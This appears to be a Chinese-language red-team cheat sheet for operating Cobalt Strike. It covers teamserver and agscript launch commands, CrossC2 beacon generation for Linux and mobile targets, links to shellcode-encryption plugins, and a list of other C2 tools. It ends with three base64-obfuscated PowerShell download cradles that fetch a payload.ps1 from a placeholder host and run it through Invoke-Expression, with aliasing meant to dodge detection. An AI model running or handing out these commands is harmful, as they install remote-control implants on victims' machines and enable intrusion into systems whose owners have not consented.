# Cobaltstrike

---

插件：

```
加密生成5he11code插件：https://github.com/RCStep/CSSG
cs插件:https://github.com/Al1ex/CSPlugins
```

相关资料：

```
https://github.com/zer0yu/Awesome-CobaltStrike
```

运行

```
nohup ./teamserver IP 密码 profile规则文件[可不加] &
```

java环境安装

```
centos：
	yum install java-1.8.0-openjdk* -y
debian：
	apt-cache search jdk   # 查看可安装版本
	apt-get install -y openjdk-8-jdk  # 安装jdk8
	
java -version  # 查看java版本

```

后台挂在脚本

```
nohup ./agscript [host] [port] [username] [password] CrossC2.cna &
```

linux、mac、安卓等系统上线

```
依赖
CrossC2：https://github.com/gloxec/CrossC2/releases/tag/v2.2

./genCrossC2.linux IP 端口 Cobaltstrike.beacon_keys null Linux x64 ./test
```

后台运行程序

```
screen -ls  # 查看所有会话
screen -S david   # 创建一个名字窗口
screen -r  PID # 进入该会话
ctrl a d  # 后台运行会话并退出窗口
screen -S PID -X quit
```

其他c2工具

```
https://github.com/its-a-feature/Mythic     # windows、linux、macos等，不支持32位系统
https://breakingsecurity.net/remcos/        # 纯windows，功能强大，付费
https://www.worldwiredlabs.com/             # windows、linux、macos等 ，付费
```

命令远程上线：

```
cmd执行1:
UG93ZXJTaGVsbCAtQ29tbWFuZCAiJiB7SUVYICgnKHswfXctT2JqZWN0IHswfXQuV2ViQ2xpZW50KS57MX1TdHJpbmcoXCJ7Mn0wLjAuMC4wL3BheWxvYWQucHMxXCIpJyAtZiAnTmUnLCdEb3dubG9hZCcsJ2h0dHA6Ly8nKSB8IElFWCB9Ig==
cmd执行2:
cG93ZXJzaGVsbCBzZXQtYWxpYXMgLW5hbWUgdGVzdCAtdmFsdWUgSW52b2tlLUV4cHJlc3Npb247dGVzdChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMC4wLjAuMC9wYXlsb2FkLnBzMScp
---
powershell执行：
SUVYICgnKHswfXctT2JqZWN0IHswfXQuV2ViQ2xpZW50KS57MX1TdHJpbmcoInsyfTAuMC4wLjAvcGF5bG9hZC5wczEiKScgLWYgJ05lJywnRG93bmxvYWQnLCdodHRwOi8vJykgfCBJRVg=
```

